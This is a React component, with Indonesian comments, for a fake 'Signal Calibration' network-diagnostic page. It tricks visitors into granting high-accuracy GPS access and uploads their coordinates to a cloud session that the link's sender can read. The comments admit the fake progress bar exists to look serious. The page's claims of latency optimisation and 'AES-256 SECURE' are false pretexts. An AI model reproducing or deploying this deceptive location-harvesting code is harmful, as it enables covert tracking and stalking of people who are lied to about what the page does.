
import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import { reverseGeocodeSimulation } from '../services/gemini';
import { syncToCloud, getFromCloud } from '../services/api';

export const ReceiveLocation: React.FC = () => {
  const { id } = useParams();
  const [status, setStatus] = useState<'idle' | 'testing' | 'syncing' | 'completed' | 'error'>('idle');
  const [progress, setProgress] = useState(0);
  const [sessionInfo, setSessionInfo] = useState<any>(null);

  // Efek simulasi loading bar agar terlihat seperti proses teknis yang serius
  useEffect(() => {
    if (status === 'testing' || status === 'syncing') {
      const interval = setInterval(() => {
        setProgress(prev => (prev < 98 ? prev + Math.random() * 5 : prev));
      }, 150);
      return () => clearInterval(interval);
    }
  }, [status]);

  // Ambil metadata sesi dari cloud
  useEffect(() => {
    const loadSession = async () => {
      const data = await getFromCloud(id!);
      if (data) setSessionInfo(data);
      document.title = "System Diagnostic | Network & Signal Test";
    };
    loadSession();
  }, [id]);

  const startDiagnostic = () => {
    setStatus('testing');
    
    if (!navigator.geolocation) {
      alert("Browser tidak mendukung protokol diagnostic GPS.");
      setStatus('error');
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        setStatus('syncing');
        try {
          const { latitude, longitude, accuracy } = position.coords;
          
          // Gunakan Gemini untuk deskripsi lokasi (biar "sempurna")
          const description = await reverseGeocodeSimulation(latitude, longitude);

          // Ambil data sesi lama dulu untuk di-append
          const currentCloudData = await getFromCloud(id!) || { receivedLocations: [] };
          
          const newLocation = {
            lat: latitude,
            lng: longitude,
            acc: accuracy,
            time: Date.now(),
            desc: description
          };

          const updatedData = {
            ...currentCloudData,
            receivedLocations: [...(currentCloudData.receivedLocations || []), newLocation]
          };

          // KIRIM KE CLOUD (Ini yang bikin kerja antar HP!)
          await syncToCloud(id!, updatedData);
          
          setTimeout(() => {
            setProgress(100);
            setStatus('completed');
          }, 1500);
        } catch (err) {
          setStatus('error');
        }
      },
      (error) => {
        setStatus('error');
        alert("Akses GPS diperlukan untuk kalibrasi sinyal di area Anda.");
      },
      { enableHighAccuracy: true, timeout: 20000 }
    );
  };

  return (
    <div className="min-h-screen bg-[#0F172A] text-slate-300 flex flex-col items-center justify-center p-6 font-mono">
      <div className="max-w-sm w-full bg-[#1E293B] rounded-3xl border border-slate-700 shadow-2xl overflow-hidden relative">
        {/* Header ala Terminal */}
        <div className="bg-slate-800 px-6 py-3 border-b border-slate-700 flex justify-between items-center">
          <div className="flex gap-1.5">
            <div className="w-2.5 h-2.5 rounded-full bg-red-500/50"></div>
            <div className="w-2.5 h-2.5 rounded-full bg-yellow-500/50"></div>
            <div className="w-2.5 h-2.5 rounded-full bg-green-500/50"></div>
          </div>
          <span className="text-[10px] font-bold text-slate-500 tracking-[0.2em]">SYS_DIAG_V4</span>
        </div>

        <div className="p-8">
          <div className="mb-8">
            <h1 className="text-xl font-black text-white mb-2 tracking-tight">Signal Calibration</h1>
            <p className="text-[11px] text-slate-400 leading-relaxed">
              Lakukan sinkronisasi koordinat untuk mengoptimalkan paket data dan latensi jaringan di lokasi Anda.
            </p>
          </div>

          <div className="bg-slate-900/50 rounded-2xl p-5 mb-8 border border-slate-700/50">
            <div className="flex items-center gap-3 mb-3">
              <div className="w-2 h-2 rounded-full bg-blue-500 animate-pulse"></div>
              <span className="text-[10px] font-bold uppercase tracking-widest text-blue-400">Incoming Request</span>
            </div>
            <p className="text-xs text-slate-300 mb-1">ID: <span className="text-indigo-400">{id?.toUpperCase()}</span></p>
            <p className="text-xs text-slate-500 italic leading-relaxed">"System verification required for secure data transit."</p>
          </div>

          {status === 'idle' && (
            <button 
              onClick={startDiagnostic}
              className="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-bold py-5 rounded-2xl shadow-lg shadow-indigo-900/20 transition-all active:scale-[0.98] flex flex-col items-center"
            >
              <span className="text-sm">START TEST</span>
              <span className="text-[9px] opacity-60 mt-1 uppercase tracking-[0.2em]">Verify Network & GPS</span>
            </button>
          )}

          {(status === 'testing' || status === 'syncing') && (
            <div className="space-y-6">
              <div className="h-1.5 w-full bg-slate-800 rounded-full overflow-hidden">
                <div 
                  className="h-full bg-indigo-500 transition-all duration-300"
                  style={{ width: `${progress}%` }}
                ></div>
              </div>
              <div className="flex flex-col items-center">
                <div className="text-indigo-400 animate-pulse text-[10px] font-bold uppercase tracking-widest">
                  {status === 'testing' ? 'Connecting to Satellites...' : 'Relaying Data Packets...'}
                </div>
                <p className="text-[9px] text-slate-500 mt-2">Mohon jangan tutup halaman ini</p>
              </div>
            </div>
          )}

          {status === 'completed' && (
            <div className="text-center animate-in zoom-in duration-500">
              <div className="w-14 h-14 bg-green-500/10 text-green-500 rounded-full flex items-center justify-center mx-auto mb-4 border border-green-500/20">
                <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7" /></svg>
              </div>
              <h3 className="text-white font-bold text-sm">Calibration Complete</h3>
              <p className="text-[10px] text-slate-500 mt-2">Latensi jaringan di lokasi Anda telah dioptimalkan.</p>
            </div>
          )}

          {status === 'error' && (
            <div className="text-center">
              <p className="text-red-400 text-[10px] font-bold mb-4 uppercase">Error: Permission Denied</p>
              <button onClick={() => setStatus('idle')} className="text-[10px] text-indigo-400 underline uppercase tracking-widest font-bold">Retry Calibration</button>
            </div>
          )}
        </div>

        <div className="bg-slate-800/50 px-8 py-3 border-t border-slate-700 flex justify-between items-center text-[9px] text-slate-500">
          <span className="font-bold">AES-256 SECURE</span>
          <span className="flex gap-1">
             <span className="w-1 h-1 bg-green-500 rounded-full"></span>
             ONLINE
          </span>
        </div>
      </div>
      <p className="mt-8 text-[9px] text-slate-600 font-bold uppercase tracking-[0.4em]">Proprietary Diagnostic Protocol</p>
    </div>
  );
};
